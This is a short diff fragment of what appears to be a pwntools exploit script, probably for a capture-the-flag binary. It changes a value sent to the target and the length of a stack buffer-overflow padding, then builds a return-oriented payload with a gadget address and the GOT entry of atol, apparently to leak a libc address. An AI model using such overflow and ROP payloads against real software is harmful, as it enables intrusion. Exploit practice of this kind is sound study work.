@@ -9,10 +9,10 @@ pause()
 
 p.recv()
 
-p.sendline('5570')
+p.sendline('2500')
 
 p.recv()
-payload = 'a' * 312
+payload = 'a' * (480 + 8)
 
 payload +=  p64(0x4008f3)
 payload += p64(e.got['atol'])
